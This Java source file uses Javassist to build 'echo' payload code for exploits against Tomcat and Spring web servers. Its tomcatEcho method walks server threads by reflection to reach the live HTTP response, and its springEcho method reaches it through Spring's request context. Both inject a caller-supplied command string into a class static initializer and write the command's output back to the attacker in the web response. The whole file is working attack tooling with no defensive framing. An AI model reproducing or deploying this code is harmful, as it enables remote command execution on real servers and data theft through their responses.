package com.mechoy.utils;

import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewMethod;

public class EchoUtils {
    public static void tomcatEcho(CtClass ctClass, String cmd) throws Exception {
        // 先添加所需要的方法
        addGetField(ctClass);

        String echo = "try {\n" +
                "   boolean flag = false;\n" +
                "   java.lang.Thread[] threads = (java.lang.Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                "   for (int i = 0; i < threads.length; i++) {\n" +
                "       java.lang.Thread thread = threads[i];\n" +
                "       if (thread != null) {\n" +
                "           String threadName = thread.getName();\n" +
                "           if (!threadName.contains(\"exec\") && threadName.contains(\"http\")) {\n" +
                "               Object target = getField(thread, \"target\");\n" +
                "               Object global = null;\n" +
                "               if (target instanceof Runnable) {\n" +
                "                   try {\n" +
                "                       global = getField(getField(getField(target, \"this$0\"), \"handler\"), \"global\");\n" +
                "                   } catch (java.lang.NoSuchFieldException fieldException) {\n" +
                "                       fieldException.printStackTrace();\n" +
                "                   }\n" +
                "               }\n" +
                "               if (global != null) {\n" +
                "                   java.util.List processors = (java.util.List) getField(global, \"processors\");\n" +
                "                   for (i = 0; i < processors.size(); i++) {\n" +
                "                       org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);\n" +
                "                       if (requestInfo != null) {\n" +
                "                           org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo, \"req\");\n" +
                "                           org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                           org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "                           flag = true;\n" +
                "                           response.getWriter().write(output.toString());\n" +
                "                           if (flag) {\n" +
                "                               break;\n" +
                "                           }\n" +
                "                       }\n" +
                "                   }\n" +
                "               }\n" +
                "           }\n" +
                "       }\n" +
                "       if (flag) {\n" +
                "           break;\n" +
                "       }\n" +
                "   }\n" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}";
        ctClass.makeClassInitializer().insertBefore(cmd + echo);
    }

    public static void springEcho(CtClass ctClass, String cmd) throws Exception {
        String echo = "try {\n" +
                "   org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "   javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "   javax.servlet.http.HttpServletResponse response = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "   response.getWriter().write(output.toString());\n" +
                "   response.setStatus(javax.servlet.http.HttpServletResponse.SC_OK);\n" +
                "   response.flushBuffer();" +
                "} catch (java.io.IOException e) {\n" +
                "   throw new java.lang.RuntimeException(e);\n" +
                "}";
        ctClass.makeClassInitializer().insertBefore(cmd + echo);
    }

    private static void addGetField(CtClass ctClass) throws Exception {
        CtMethod getField = CtNewMethod.make("public static Object getField(Object obj, String fieldName) throws Exception {\n" +
                "   java.lang.reflect.Field field = null;\n" +
                "   java.lang.Class clas = obj.getClass();\n" +
                "   while (clas != Object.class) {\n" +
                "       try {\n" +
                "           field = clas.getDeclaredField(fieldName);\n" +
                "           break;\n" +
                "       } catch (java.lang.NoSuchFieldException e) {\n" +
                "           clas = clas.getSuperclass();\n" +
                "       }\n" +
                "   }\n" +
                "   if (field != null) {\n" +
                "       field.setAccessible(true);\n" +
                "       return field.get(obj);\n" +
                "   } else {\n" +
                "       throw new java.lang.NoSuchFieldException(fieldName);\n" +
                "   }\n" +
                "}", ctClass);
        ctClass.addMethod(getField);
    }
}
